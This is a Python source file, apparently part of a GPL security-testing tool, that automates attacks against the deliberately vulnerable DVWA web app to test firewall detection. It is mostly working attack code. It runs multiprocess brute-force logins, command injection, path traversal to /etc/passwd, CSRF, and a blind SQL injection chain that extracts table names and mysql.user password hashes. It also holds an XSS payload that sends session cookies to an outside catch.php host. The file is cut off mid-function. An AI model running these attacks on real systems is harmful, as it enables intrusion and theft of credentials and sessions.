"""
    This is the DVWAAttacks class file. This is where all of the black magic
    happens. Everything built into this class set of functions was manually
    tested and verified prior to being included here in its automated fashion.
    
    License:
    assay
    Copyright (C) 2010 - 2013 Bayshore Networks, Inc.

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""
import re
import time
import base64
import difflib
import hashlib
import webbrowser
import os
import glob
import funcs
import vars
import wafw00f
import itertools
import urllib
import urllib2
import logging
import multiprocessing
from HTMLGenerator import HTMLGenerator
from httplib import BadStatusLine
from urllib2 import URLError

"""
    DVWAAttacks class
    Most documentation is inline with the
    functions of this class
"""
class DVWAAttacks:
    
    """
        Constructor
        Should be self explanatory
    """
    def __init__(self, targeturl, apppath):
        object.__init__(self)
        self.url = targeturl
        self.apppath = apppath
        self.uploadpath = "hackable/uploads/"
        self.wafbaseline = None
        self.wafDetected = None
        self.bruteArr = []
        self.prefix = ""
        self.htmlgen = HTMLGenerator(targeturl=targeturl)
        
    def sanitizeVector(self, vect="", xss=False):
        pvect = ""
        if vect.startswith("<"):
            try:
                pvect = urllib.urlencode(vect)
            except:
                pvect = "non-printable"
        else:
            pvect = vect
        if xss:
            if 'http' in pvect:
                pvect = "non-printable"
            
        return pvect

    def setHTMLFilePrefix(self, val=0):
        if val == 0:
            self.prefix = "pre_"
        if val == 1:
            self.prefix = "post_"
    
    def saveHTML(self):
        fh = vars.getHtmlPath() + self.prefix + vars.getHtmlFileName() + funcs.getTimeStamp() + vars.getHtmlFileExt()
        self.htmlgen.saveHTML(fhandle=fh,keyval=vars.typecount)
        funcs.attackOutPut(funcs.stepOne, "info", "HTML was written to file: %s" % fh)
        
    def writeWafHtml(self, val=""):
        if val:
            self.htmlgen.writeHtmlTableCell(success=True, attackType="Recon",
                                            target=self.url, vect=val)
        else:
            self.htmlgen.writeHtmlTableCell(success=False, attackType="Recon",
                                            target=self.url, vect="WAF Vendor not detected")
    
    """
        for some of the browser displayed attacks to
        be successful we need an authenticated 
        browser instance out there, so this kicks
        that off
    """
    def startUpBrowser(self):
        webbrowser.open(self.url + self.apppath + vars.loginbypass + "?u=" + vars.user + "&p=" + vars.userpass, new=2, autoraise=True)
    # EOF

    """
        try to do a detection of any WAF in place with the target,
        using wafw00f's API
    """
    def detectWAF(self):
        vars.typecount['recon'][0] += 1
        logging.basicConfig(level=40)
        wf = wafw00f.wafwoof_api()

        self.wafDetected = wf.vendordetect(self.url)
        return self.wafDetected
    # EOF

    """
        establish an MD5 hash as a baseline,
        this would be of a known good action
        in response to overt malicious injections
    """
    def setRedirBaseline(self, fp='', url=''):
        """
            use overt and obvious attack vectors that would get
            detected by any WAF. then we can get a baseline of a
            response where a WAF does a redirect (to some error page
            or something of the sort) based on an attack vector
            being identified
        """
        base = url + vars.apppath + vars.targetpath
        wbs = None
        wbsql = None
        wbsxss = None
        # do a path traversal
        try:
            m = hashlib.md5()
            fp.open(base + "fi/" + "?page=../../../../../../etc/passwd")
            m.update(str(fp.response().read()))
            wbs = m.hexdigest()
        except:
            pass
        
        try:
            # do a sqli
            msql = hashlib.md5()
            tstr = funcs.formSubmit(fp, base + "sqli/", 0, {"id":"blah' OR 1=1"}, sleep=False)
            msql.update(tstr)
            wbsql = msql.hexdigest()
        except:
            pass
    
        try:
            # do an xss
            mxss = hashlib.md5()
            tstr = funcs.formSubmit(fp, base + "xss_r/", 0, {"name":"<script>alert('XSS')</script>"}, sleep=False)
            mxss.update(tstr)
            wbsxss = mxss.hexdigest()
        except:
            pass

        """
            so if this var is not None then we have detected that a
            redirect by a WAF is in place
        """
        if wbs and wbsql and wbsxss:  
            if wbs == wbsql and wbs == wbsxss and wbsql == wbsxss:
                self.wafbaseline = wbs
                return        
        if wbs and wbsql:
            if wbs == wbsql:
                self.wafbaseline = wbs
                return
        if wbs and wbsxss:
            if wbs == wbsxss:
                self.wafbaseline = wbs
                return
        if wbsql and wbsxss:
            if wbsql == wbsxss:
                self.wafbaseline = wbsql
                return
    # EOF

    """
        if a MD5 baseline has been established then
        check a response's MD5 here, if they match then
        it is assumed that the WAF is blocking the
        given request
    """
    def isWAFBaseline(self, chk):
        if self.wafbaseline:
            if chk == self.wafbaseline:
                """
                    increase this value because we know there is
                    match against a known response from a WAF
                """
                vars.blockedVectors += 1
                return True

        return False
    # EOF
    
    """
    
    """
    def bruteAttack(self, cru='', user='', crp='', psw='', fp='', targetpage=''):
        for p in psw:
            resp = funcs.formSubmit(fp, targetpage, 0, {cru:user, crp:p}, sleep=False)
            vars.typecount['brute'][0] += 1

            if "incorrect" not in resp:
                funcs.attackOutPut(funcs.stepFive, "discovered", "Found - user: %s, psw: %s" % (user, p))
                self.bruteArr.append(user + ":" + p)
                return

    """
        attackbrute covers areas of:
        OWASP Top 10 - A3: Broken Authentication and Session Management
        
        This is a standard brute-force test against an instance
        of the DVWA login form. The actual brute-force attemtps
        are staggered so as not to give away a steady pattern of attempts.
        If you want to add more brute-force data, pop the data into
        either 'userz' or 'passwdz' respectively (the file names should
        give away their purpose)
    """
    def attackbrute(self, fp, targetpage):
        '''
            this represents a failure of the brute force data
            this was for 1.0.6
            brutefailedstr = "<pre><br>Username and/or password incorrect.</pre>"
        '''
        brutefailedstr = "Failed"
        bruteFailReg = re.compile(brutefailedstr,re.I+re.MULTILINE)
        discattacks = []

        credresp = funcs.doLoginFormDiscovery(targetpage)
        
        # get passes
        file2 = open(vars.getStaticPath() + "passwdz")
        lines2 = file2.readlines(1000)
        lines2 = [x.strip() for x in lines2]
        
        
        #with open('userz') as userz:
            #for u in userz:
                #u = u.strip()
                
        #file = open("userz")
        #lines = file.readlines(1000)
        #lines = [x.strip() for x in lines]

        lines = ["admin", "test", "user", "bob", "smithy", "Hack", "pablo", "badguy"]
        # admin
        a = multiprocessing.Process(name='self.bruteAttack', target=self.bruteAttack, args=(credresp['user'],lines[0],credresp['passwd'],lines2,fp,targetpage,))
        a.daemon = True
        a.start() 
        # test
        b = multiprocessing.Process(name='self.bruteAttack', target=self.bruteAttack, args=(credresp['user'],lines[1],credresp['passwd'],lines2,fp,targetpage,))
        b.daemon = True
        b.start()
        # user
        c = multiprocessing.Process(name='self.bruteAttack', target=self.bruteAttack, args=(credresp['user'],lines[2],credresp['passwd'],lines2,fp,targetpage,))
        c.daemon = True
        c.start()
        # bob
        d = multiprocessing.Process(name='self.bruteAttack', target=self.bruteAttack, args=(credresp['user'],lines[3],credresp['passwd'],lines2,fp,targetpage,))
        d.daemon = True
        d.start()
        # smithy
        e = multiprocessing.Process(name='self.bruteAttack', target=self.bruteAttack, args=(credresp['user'],lines[4],credresp['passwd'],lines2,fp,targetpage,))
        e.daemon = True
        e.start()
        # Hack
        f = multiprocessing.Process(name='self.bruteAttack', target=self.bruteAttack, args=(credresp['user'],lines[5],credresp['passwd'],lines2,fp,targetpage,))
        f.daemon = True
        f.start()
        # pablo
        g = multiprocessing.Process(name='self.bruteAttack', target=self.bruteAttack, args=(credresp['user'],lines[6],credresp['passwd'],lines2,fp,targetpage,))
        g.daemon = True
        g.start()
        # badguy
        h = multiprocessing.Process(name='self.bruteAttack', target=self.bruteAttack, args=(credresp['user'],lines[7],credresp['passwd'],lines2,fp,targetpage,))
        h.daemon = True
        h.start()
        
        a.join()
        b.join()
        c.join()
        d.join()
        e.join()
        f.join()
        g.join()
        h.join()

        if len(self.bruteArr) > 0:
            return self.bruteArr
        else:
            return None        
    # EOF
    
    """
        attackexposesession covers areas of:
        OWASP Top 10 - A3: Broken Authentication and Session Management

        This is basically a XSS display of how critical Session ID
        data can get stolen or leaked out. These 2 demo's are both
        browser based due to the dependence on javascript.
        Attack vector in the clear
        
        <script>new Image().src="http://sec.neurofuzz-software.com/e4589efff654d91e26b43333dbf41425/catch.php?cookie="+encodeURI(document.cookie);</script>
    """
    def attackexposesession(self, fp, targetpage):
        #################################################################################
        """
            this first one will use a traditional XSS to expose a Session ID
            you should see the browser pop up with a javascript alert
            popup exposing the document.cookie data
        """
        if vars.getUseBrowser():
            funcs.attackOutPut(funcs.stepThree, "step", "Attempting to display an XSS Attack leading to a leak of Session ID data")
            xssurl = self.url + self.apppath + "vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3B%3C%2Fscript%3E#"
            try:
                webbrowser.open(xssurl, new=2, autoraise=True)
                funcs.attackOutPut(funcs.stepThree, "step", "A browser window/tab should have opened up with a javascript popup displaying the leak")
            except webbrowser.Error:
                funcs.attackOutPut(funcs.stepFour, "info", "Could not instantiate the browser - check out '%s' manually" % xssurl)
            time.sleep(8)
        #################################################################################
        """
            this one will use a different XSS to expose a Session ID
            by sending it to a remote PHP page that records the data
            We will do this via the browser since mechanize does not
            have real javascript support just yet
        """
        try:
            funcs.attackOutPut(funcs.stepThree, "step", "Attempting to leak Session ID data via XSS")
            if vars.getUseBrowser():
                webbrowser.open(self.url + self.apppath + "vulnerabilities/xss_r/?name=%3Cscript%3Enew+Image%28%29.src%3D%22" + vars.exturl + vars.extpath + "catch.php%3Fcookie%3D%22%2BencodeURI%28document.cookie%29%3B%3C%2Fscript%3E")
            
            stamp = funcs.createRandAlpha(length=30)
            response = ""
            encoded = ""
            query_args = {'name':'<script>new+Image().src="' + vars.getExtUrl() + 'catch.php?'}
            encoded += urllib.urlencode(query_args)
            query_args = {'cookie':'+encodeURI(document.cookie);+"&'}
            encoded += urllib.urlencode(query_args)
            query_args = {'stamp':stamp}
            encoded += urllib.urlencode(query_args)
            encoded += '%3C%2Fscript%3E"'
            try:
                urllib2.urlopen(self.url + self.apppath + "vulnerabilities/xss_r/?" + encoded)
                time.sleep(8)
            except:
                pass
            
            if vars.getUseBrowser():
                webbrowser.open(vars.getExtUrl() + "catch.php", new=2, autoraise=True)
                funcs.attackOutPut(funcs.stepThree, "step", "A browser window/tab should have opened up with leaked session data in an external page")
            try:
                response = urllib2.urlopen(vars.getExtUrl() + "catch.php")
                if stamp in response:
                    self.htmlgen.writeHtmlTableCell(success=True, attackType="Expose Session",
                                                    target=self.url + self.apppath + "vulnerabilities/xss_r/", vect=encoded)
                else:
                    self.htmlgen.writeHtmlTableCell(success=False, attackType="Expose Session",
                                                    target=self.url + self.apppath + "vulnerabilities/xss_r/", vect=encoded)
            except:
                pass
        except webbrowser.Error:
            funcs.attackOutPut(funcs.stepFour, "info", "Could not instantiate the browser - check out %s" % vars.getExtUrl() + "catch.php")
        #################################################################################
        return None
    # EOF

    """
        attackexec covers areas of:
        OWASP Top 10 - A1: Injection

        These vectors create system level command injections that, when successful,
        expose sensitive system level data
    """
    def attackexec(self, fp, targetpage):
        """
            construct regex to detect a successful injection.
            cmdsuccessstr is present after a POST that was
            not successful as an attack, if there is data
            between those tags that means the attack vector
            was successful
        """
        cmdsuccessstr = "<pre></pre>"
        discattacks = []
        pvect = ""

        with open(vars.getStaticPath() + 'cmdi.txt') as vectorz:
            # iterate thru vectors
            for p in vectorz:
                # split vector up based on delimiter :::
                p = p.split(":::")[0]
                pvect = self.sanitizeVector(vect=p)

                tstr = funcs.formSubmit(fp, targetpage, 0, {"ip":p}, sleep=False)
                vars.typecount['exec'][0] += 1

                m = hashlib.md5()
                m.update(tstr)
                bs = m.hexdigest()

                #if not regCmd.search(tstr) or not regPing.search(tstr):
                # this means the regular page is not the response
                if cmdsuccessstr not in str(tstr) and not self.isWAFBaseline(bs):

                    # check for suspected WAF block
                    if not funcs.isBlock(tstr):
                        if p not in discattacks:
                            discattacks.append(p)
                            vars.typecount['exec'][1] += 1
                            self.htmlgen.writeHtmlTableCell(success=True, attackType="Exec",
                                                    target=targetpage, vect=pvect)
                    else:
                        vars.typecount['exec'][2] += 1
                        self.htmlgen.writeHtmlTableCell(success=False, attackType="Exec",
                                                target=targetpage, vect=pvect)
                else:
                    vars.typecount['exec'][2] += 1
                    self.htmlgen.writeHtmlTableCell(success=False, attackType="Exec",
                                            target=targetpage, vect=pvect)

        if len(discattacks) > 0:
            return discattacks
        else:
            return None
    # EOF

    """
        attackcsrf covers areas of:
        OWASP Top 10 - A5: Cross-Site Request Forgery (CSRF) 

        CSRF demo utilizing the browser and hitting a remote page
    """
    def attackcsrf(self, fp, targetpage):
        """
            To show this we will hit a page on an external site
            entirely unrelated to the target. It would simulate
            a victim hitting a remote site with CSRF infected hyperlinks.

            The actual target malicious link is something like:

            http://target/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#

            but this resides on the remote side. The remote url is:

            "http:///sec.neurofuzz-software.com/e4589efff654d91e26b43333dbf41425/bayshorecsrf.php?target="+base64.b64encode(self.url)
        """
        funcs.attackOutPut(funcs.stepThree, "step", "Attempting to use a CSRF Attack via a browser window/tab")
        try:
            time.sleep(8)
            webbrowser.open(vars.exturl + vars.extpath + "bayshorecsrf.php?token="+base64.b64encode(self.url))
            funcs.attackOutPut(funcs.stepThree, "step", "Check your browser access to the original login with DVWA")
        except webbrowser.Error:
            funcs.attackOutPut(funcs.stepFour, "info", "Could not instantiate the browser - hit this manually: %s" % vars.exturl + vars.extpath + "bayshorecsrf.php?token="+base64.b64encode(self.url))

        return "attackcsrf"
    # EOF

    """
        attackfi covers areas of:
        OWASP Top 10 - A4: Insecure Direct Object References

        This utilizes path manipulation techniques to gain
        direct access to resources we should not have access
        to
    """
    def attackfi(self, fp, targetpage):
        """
            look something like this:
            http://target/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd
        """
        m = hashlib.md5()
        baseline = None
        # get a baseline of a response where nothing is returned
        # i.e this is a failure
        try:
            fp.open(targetpage + "?page=dskvdslcvlsdbclsad")
            m.update(str(fp.response().read()))
            baseline = m.hexdigest()
        except Exception, ex:
            # *******************
            #print "Exception: %s" % ex
            #return None
            pass

        discattacks = []

        with open(vars.getStaticPath() + 'fi.txt') as vectorz:
            for v in vectorz:
                v = v.strip()
                pvect = self.sanitizeVector(vect=v)
                vars.typecount['fi'][0] += 1
                try:
                    fp.open(targetpage + "?page=" + "%s" % v)
                    mi5 = hashlib.md5()
                    # get a comparison hash
                    mi5.update(str(fp.response().read()))
                    newhash = mi5.hexdigest()

                    if baseline != newhash and not self.isWAFBaseline(newhash):
                        discattacks.append(v)
                        vars.typecount['fi'][1] += 1
                        self.htmlgen.writeHtmlTableCell(success=True, attackType="File Inclusion",
                                                target=targetpage, vect=pvect)
                    else:
                        vars.typecount['fi'][2] += 1
                        self.htmlgen.writeHtmlTableCell(success=False, attackType="File Inclusion",
                                                target=targetpage, vect=pvect)
                except Exception:
                    vars.typecount['fi'][2] += 1
                    self.htmlgen.writeHtmlTableCell(success=False, attackType="File Inclusion",
                                            target=targetpage, vect=pvect)
                    pass

        if len(discattacks) > 0:
            return discattacks
        else:
            return None
    # EOF

    """
        attacksqli covers areas of:
        OWASP Top 10 - A1: Injection

        Standard dictionary based attack pattern for SQL Injection
        vectors.
    """
    def attacksqli(self, fp, targetpage):
        sqlisuccessstr = "First"
        # compile regex for success based on the dvwa page
        # displaying the attack vector, this means the
        # injection was successful
        regSQLi = re.compile(sqlisuccessstr,re.I+re.MULTILINE)
        # error regex for false positives when MySQL throws
        # a syntax error
        regErr = re.compile("error",re.I+re.MULTILINE)
        discattacks = []
        pvect = ""

        with open(vars.getStaticPath() + 'sqli.txt') as vectorz:
            # iterate thru vectors
            for p in vectorz:
                # split vector up based on delimiter :::
                p = p.split(":::")[0]
                pvect = self.sanitizeVector(vect=p)

                tstr = funcs.formSubmit(fp, targetpage, 0, {"id":p}, sleep=False)
                vars.typecount['sqli'][0] += 1
                if not regErr.search(tstr):
                    if regSQLi.search(tstr):
                        discattacks.append(p)
                        #print "\n\n**********SQLi: %s\n\n" % p
                        vars.typecount['sqli'][1] += 1
                        self.htmlgen.writeHtmlTableCell(success=True, attackType="SQLi",
                                                target=targetpage, vect=pvect)
                    else:
                        vars.typecount['sqli'][2] += 1
                        self.htmlgen.writeHtmlTableCell(success=False, attackType="SQLi",
                                                target=targetpage, vect=pvect)
                else:
                    vars.typecount['sqli'][2] += 1
                    self.htmlgen.writeHtmlTableCell(success=False, attackType="SQLi",
                                            target=targetpage, vect=pvect)

        if len(discattacks) > 0:
            return discattacks
        else:
            return None
    # EOF

    """
        attacksqli_blind covers areas of:
        OWASP Top 10 - A1: Injection

        This is an automation of what a real skilled attacker
        would potentially do against a target of this nature.
        It is merely an automation of steps/processes performed
        manually and verified against DVWA. But it is the most
        sophisticated part of this program.
    """
    def attacksqli_blind(self, fp, targetpage):

        #targetpage = targetpage[:-6]
        #targetpage = targetpage + "/"
        """
            SK seems to reply with this when it blocks:
            
            Error in form submit: HTTP Error 500: ...
        """
        errfailstr = "Error"
        errFail = re.compile(errfailstr,re.I+re.MULTILINE)
        ########################################################################
        funcs.attackOutPut(funcs.stepThree, "info", "SQLi - Recon - attempting to extract protected elements of data\n")
        ########################################################################
        funcs.attackOutPut(funcs.stepThree, "step", "SQLi - trying to discover MySQL Version")

        pvect = ""
        """
            try to extract the version of MySQL at hand
        """
        version = []
        # regex for failure
        regverfailstr = "Unknown"
        regVerFail = re.compile(regverfailstr,re.I+re.MULTILINE)
        for i in range(1,4):

            injection = "blah' UNION ALL SELECT 1, @@version;#"
            resp = funcs.formSubmit(fp, targetpage, 0, {"id":injection}, sleep=False)
            vars.typecount['sqli_blind'][0] += 1
            if not regVerFail.search(resp) and not errFail.search(resp):
                cnt = 0
                for r in re.findall(": ([\w.-]*)<", resp):
                    if cnt == 1:
                        if not r in version:
                            version.append(r)
                            #print "\n\n**********SQLi Blind: %s\n\n" % r
                            vars.typecount['sqli_blind'][1] += 1
                            self.htmlgen.writeHtmlTableCell(success=True, attackType="Blind SQLi",
                                                    target=targetpage, vect=injection)
                        else:
                            vars.typecount['sqli_blind'][2] += 1
                            self.htmlgen.writeHtmlTableCell(success=False, attackType="Blind SQLi",
                                                    target=targetpage, vect=injection)
                    cnt += 1
            else:
                vars.typecount['sqli_blind'][2] += 1
                self.htmlgen.writeHtmlTableCell(success=False, attackType="Blind SQLi",
                                        target=targetpage, vect=injection)

        if len(version) > 0:
            for v in version:
                funcs.attackOutPut(funcs.stepFour, "discovered", "%s" % v)
                vars.successfulVectors += 1
        else:
            funcs.attackOutPut(funcs.stepFour, "nothingfound", "MySQL version info was NOT extracted")
        ########################################################################
        funcs.attackOutPut(funcs.stepThree, "step", "SQLi - trying to calculate the length of the DB name at hand")
        """
            trying to calculate the length of the DB name at hand
            this could be helpful in terms of putting together a
            dictionary for a subsequent brute-force attack
            I chose 50 at random, figured it was enough for most DB names
        """
        regdblength = "<pre>"
        nlength = 0
        # regex for success
        regDBLengthSuccess = re.compile(regdblength,re.I+re.MULTILINE)
        try:
            for num in range(1,51):

                injection = "blah' OR database() LIKE '%s';#" % ("_"*num)
                resp = funcs.formSubmit(fp, targetpage, 0, {"id":injection}, sleep=False)
                #print resp
                vars.typecount['sqli_blind'][0] += 1
                if regDBLengthSuccess.search(resp) and not errFail.search(resp):
                    funcs.attackOutPut(funcs.stepFour, "discovered", "DB name length discovered at: %d" % num)
                    nlength = num
                    vars.successfulVectors += 1
                    #print "\n\n**********SQLi - hit on length calculation %s\n\n" % str(nlength)
                    vars.typecount['sqli_blind'][1] += 1
                    self.htmlgen.writeHtmlTableCell(success=True, attackType="Blind SQLi",
                                            target=targetpage, vect=injection)
                    raise StopIteration()
                else:
                    vars.typecount['sqli_blind'][2] += 1
                    self.htmlgen.writeHtmlTableCell(success=False, attackType="Blind SQLi",
                                            target=targetpage, vect=injection)
            # size not found
            funcs.attackOutPut(funcs.stepFour, "nothingfound", "DB name length NOT discovered")
        except StopIteration:
            pass
        ########################################################################
        funcs.attackOutPut(funcs.stepThree, "step", "SQLi - trying to calculate the pool of chars for the DB name at hand")
        pool = []
        """
            trying to calculate the pool of possible chars
            of the DB name at hand
            this could be helpful in terms of putting together a
            dictionary for a subsequent brute-force attack
        """
        regpoolsuccess = "<pre>"
        # regex for success
        regDBPoolSuccess = re.compile(regpoolsuccess,re.I+re.MULTILINE)
        try:
            for letter in range(ord('a'), ord('z') + 1):

                injection = "blah' OR database() LIKE '%%%s%%';#" % chr(letter)
                resp = funcs.formSubmit(fp, targetpage, 0, {"id":injection}, sleep=False)
                vars.typecount['sqli_blind'][0] += 1
                if regDBPoolSuccess.search(resp) and not errFail.search(resp):
                    if chr(letter) not in pool:
                        pool.append(chr(letter))
                        #print "\n\n**********SQLi - pool of chars: %s\n\n" % chr(letter)
                        vars.typecount['sqli_blind'][1] += 1
                        self.htmlgen.writeHtmlTableCell(success=True, attackType="Blind SQLi",
                                                target=targetpage, vect=injection)
                else:
                    vars.typecount['sqli_blind'][2] += 1
                    self.htmlgen.writeHtmlTableCell(success=False, attackType="Blind SQLi",
                                            target=targetpage, vect=injection)
                
                if len(pool) == nlength:
                        raise StopIteration()
        except StopIteration:
            pass

        if len(pool) == nlength and nlength > 0:
            funcs.attackOutPut(funcs.stepFour, "discovered", "All chars that make up the DB name have been discovered: %s" % ''.join(pool))
            funcs.attackOutPut(funcs.stepFour, "info", "Possible combinations:")
            vars.successfulVectors += 1
            for l in list(map("".join, itertools.permutations(''.join(pool)))):
                funcs.attackOutPut(funcs.stepFive, "info", l)
        else:
            funcs.attackOutPut(funcs.stepFour, "nothingfound", "Chars that make up the DB name have NOT been discovered")
        ########################################################################
        funcs.attackOutPut(funcs.stepThree, "step", "SQLi - trying to enumerate existing DB tables")
        """
            try to enumerate DB tables
            the <pre> tag only shows up when there are results returned
        """
        tableresults = {}
        regtablestr = "<pre>"
        # regex for success
        regTableSuccess = re.compile(regtablestr,re.I+re.MULTILINE)
        """
            example result:
            <pre>ID: blah' UNION SELECT table_schema, table_name FROM information_schema.tables;#<br>First name: phpmyadmin<br>Surname: pma_pdf_pages</pre>
            we select 2 fields due to the output of this app which is based on 2 attribures, first and last name
        """
        injection = "blah' UNION SELECT table_schema, table_name FROM information_schema.tables;#"
        resp = funcs.formSubmit(fp, targetpage, 0, {"id":injection}, sleep=False)
        vars.typecount['sqli_blind'][0] += 1
        if regTableSuccess.search(resp) and not errFail.search(resp):
            cnt = 2
            for r in re.findall(": (\w*)<",resp):
                # key doesnt exist so add it
                if cnt % 2 == 0:
                    if r not in tableresults:
                        tableresults[r] = []
                        thiskey = r
                if cnt % 2 == 1:
                    tableresults[thiskey].append(r)
                cnt += 1
            #print "\n\n**********SQLi - enum: %s\n\n" % r
            vars.typecount['sqli_blind'][1] += 1
            self.htmlgen.writeHtmlTableCell(success=True, attackType="Blind SQLi",
                                    target=targetpage, vect=injection)
        else:
            vars.typecount['sqli_blind'][2] += 1
            self.htmlgen.writeHtmlTableCell(success=False, attackType="Blind SQLi",
                                    target=targetpage, vect=injection)

        if len(tableresults) > 0:
            funcs.attackOutPut(funcs.stepFour, "discovered", "DB Tables discovered:")
            for key,values in tableresults.items():
                funcs.attackOutPut(funcs.stepFive, "discovered", key)
                for v in values:
                    funcs.attackOutPut(funcs.stepSix, "discovered", v)
                    vars.successfulVectors += 1
        else:
            funcs.attackOutPut(funcs.stepFour, "nothingfound", "No DB Tables discovered")
        ########################################################################
        funcs.attackOutPut(funcs.stepThree, "step", "SQLi - trying to get sys level password hashes")
        """
            try to enumerate password hashes
            the <pre> tag only shows up when there are results returned
        """
        passhashes = {}
        reghashstr = "<pre>"
        # regex for success
        regHashSuccess = re.compile(reghashstr,re.I+re.MULTILINE)
        """
            example result:
            <pre>ID: blah' UNION ALL SELECT user, password FROM mysql.user;#<br>First name: admin<br>Surname: admin</pre>
        """
        injection = "blah' UNION ALL SELECT user, password FROM mysql.user;#"
        resp = funcs.formSubmit(fp, targetpage, 0, {"id":injection}, sleep=False)
        vars.typecount['sqli_blind'][0] += 1
        if regHashSuccess.search(resp) and not errFail.search(resp):
            cnt = 2
            for r in re.findall(": ([\w\*-]*)<",resp):
                if r:
                    if cnt % 2 == 0:
                        if r not in passhashes:
                            passhashes[r] = []
                            hashkey = r
                    if cnt % 2 == 1:
                        if r not in passhashes[hashkey]:
                            passhashes[hashkey].append(r)
                cnt += 1
            #print "\n\n**********SQLi - enum psw: %s\n\n" % r
            vars.typecount['sqli_blind'][1] += 1
            self.htmlgen.writeHtmlTableCell(success=True, attackType="Blind SQLi",
                                    target=targetpage, vect=injection)
        else:
            vars.typecount['sqli_blind'][2] += 1
            self.htmlgen.writeHtmlTableCell(success=False, attackType="Blind SQLi",
                                    target=targetpage, vect=injection)

        if len(passhashes) > 0:
            funcs.attackOutPut(funcs.stepFour, "discovered", "Hashes discovered:")
            for key,vals in passhashes.items():
                funcs.attackOutPut(funcs.stepFive, "discovered", key)
                for val in vals:
                    funcs.attackOutPut(funcs.stepSix, "discovered", val)
                    vars.successfulVectors += 1
        else:
            funcs.attackOutPut(funcs.stepFour, "nothingfound", "No hashes discovered")
        ########################################################################
        funcs.attackOutPut(funcs.stepThree, "step", "SQLi - dictionary attack - trying to enumerate DB tables")
        """
            try to enumerate user DB tables
            the <pre> tag only shows up when there are results returned
        """
        tabledoesntexist = "doesn't exist"
        regTableFail = re.compile(tabledoesntexist,re.I+re.MULTILINE)
        tablename = []

        tables = ['users', 'user', 'admin', 'identity']
        for table in tables:

            injection = "1' AND 1=(SELECT COUNT(*) FROM %s);#" % table
            resp = funcs.formSubmit(fp, targetpage, 0, {"id":injection}, sleep=False)

            m = hashlib.md5()
            m.update(resp)
            bs = m.hexdigest()

            vars.typecount['sqli_blind'][0] += 1
            if not regTableFail.search(resp) and not self.isWAFBaseline(bs) and not errFail.search(resp):
                tablename.append(table)
                #print "\n\n**********SQLi - enum table: %s\n\n" % table
                vars.typecount['sqli_blind'][1] += 1
                self.htmlgen.writeHtmlTableCell(success=True, attackType="Blind SQLi",
                                        target=targetpage, vect=injection)
            else:
                vars.typecount['sqli_blind'][2] += 1
                self.htmlgen.writeHtmlTableCell(success=False, attackType="Blind SQLi",
                                        target=targetpage, vect=injection)

        if len(tablename) > 0:
            if len(tablename) == 1:
                tt = "table"
            if len(tablename) > 1:
                tt = "tables"
            funcs.attackOutPut(funcs.stepFour, "discovered", "DB %s discovered:" % tt)
            for t in tablename:
                funcs.attackOutPut(funcs.stepFive, "discovered", "%s" % t)
                vars.successfulVectors += 1
        else:
            funcs.attackOutPut(funcs.stepFour, "nothingfound", "No DB tables discovered")
        ########################################################################
        if len(tablename) > 0:
            funcs.attackOutPut(funcs.stepThree, "step", "SQLi - trying to get a count of columns for the DB table in use: %s" % tablename[0])
            """
                try to enumerate columns
                nothin being return means that there is at least one column
                if the threshold of existing column numbers is surpassed then
                the error in var regfailstr is displayed
            """
            columncnt = 0
            # regex for failure
            regfailstr = "Unknown column"
            regFail = re.compile(regfailstr,re.I+re.MULTILINE)
            for i in range(1,15):

                injection = "blah' ORDER BY %s;#" % str(i)
                resp = funcs.formSubmit(fp, targetpage, 0, {"id":injection}, sleep=False)
                vars.typecount['sqli_blind'][0] += 1
                if not regFail.search(resp) and not errFail.search(resp):
                    columncnt += 1
                    if i == 1:
                        c = "column"
                    if i > 1:
                        c = "columns"
                    funcs.attackOutPut(funcs.stepFour, "discovered", "The target DB table has at least %s %s" % (i,c))
                    vars.successfulVectors += 1
                    #print "\n\n**********SQLi - enum columns: %s %s\n\n" % (i,c)
                    vars.typecount['sqli_blind'][1] += 1
                    self.htmlgen.writeHtmlTableCell(success=True, attackType="Blind SQLi",
                                            target=targetpage, vect=injection)
                else:
                    vars.typecount['sqli_blind'][2] += 1
                    self.htmlgen.writeHtmlTableCell(success=False, attackType="Blind SQLi",
                                            target=targetpage, vect=injection)

            if columncnt < 1:
                funcs.attackOutPut(funcs.stepFour, "nothingfound", "SQLi - Column count was NOT successful")
        ########################################################################
        funcs.attackOutPut(funcs.stepThree, "step", "SQLi - trying to enumerate field names for the DB table in use")
        """
            discover table field names
            if there is no column by the name of what we pass in
            the error in var regfailstr is displayed
        """
        names = ['firstname', 'firstName', 'first_name', 'user_id', 'userid',
                 'lastname', 'lastName', 'last_name', 'image', 'links', 'link',
                 'avatar', 'pass', 'passwd', 'password', 'user', 'images',
                 'nickname', 'nick_name'
                 ]
        fieldnames = []
        # regex for failure
        regfailstr = "Unknown column"
        regFail = re.compile(regfailstr,re.I+re.MULTILINE)
        for name in names:

            injection = "blah' OR %s IS NULL;#" % name
            resp = funcs.formSubmit(fp, targetpage, 0, {"id":injection}, sleep=False)

            m = hashlib.md5()
            m.update(resp)
            bs = m.hexdigest()

            vars.typecount['sqli_blind'][0] += 1
            if not regFail.search(resp) and not self.isWAFBaseline(bs) and not errFail.search(resp):
                fieldnames.append(name)
                #print "\n\n**********SQLi - field name: %s\n\n" % name
                vars.typecount['sqli_blind'][1] += 1
                self.htmlgen.writeHtmlTableCell(success=True, attackType="Blind SQLi",
                                        target=targetpage, vect=injection)
            else:
                vars.typecount['sqli_blind'][2] += 1
                self.htmlgen.writeHtmlTableCell(success=False, attackType="Blind SQLi",
                                        target=targetpage, vect=injection)
                
        if len(fieldnames) > 0:
            funcs.attackOutPut(funcs.stepFour, "discovered", "DB field names discovered:")
            for f in fieldnames:
                funcs.attackOutPut(funcs.stepFive, "discovered", "%s" % f)
                vars.successfulVectors += 1
        else:
            funcs.attackOutPut(funcs.stepFour, "nothingfound", "No DB field names discovered")
        ########################################################################
        funcs.attackOutPut(funcs.stepThree, "step", "SQLi - trying to enumerate user names from the DB table in use")
        """
            try to enumerate user names
            the <pre> tag only shows up when there are results returned
        """
        usernames = []
        regnamestr = "<pre>"
